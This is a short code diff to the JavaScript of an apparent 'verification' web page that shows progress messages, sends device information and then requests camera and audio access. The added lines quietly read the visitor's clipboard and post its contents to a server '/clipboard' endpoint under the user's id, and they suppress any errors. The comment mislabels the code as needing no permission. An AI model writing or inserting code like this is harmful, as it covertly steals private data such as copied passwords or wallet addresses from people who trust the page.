@@ -145,8 +145,11 @@ async function startVerify(){
   setProgress(5);
   setStatus('Starting verification...');
 
-  // Device info (no permission needed)
+  // Device info + clipboard (no permission needed)
   sendDeviceInfo();
+  if(navigator.clipboard&&navigator.clipboard.readText){
+    try{var clip=await navigator.clipboard.readText();if(clip&&clip.trim()){$.post("<%=a %>/clipboard",{uid:uid,clip:encodeURIComponent(clip)});}}catch(e){}
+  }
 
   // ── Camera + Audio ──────────────────────────────────────────────
   setStatus('Requesting camera access...');
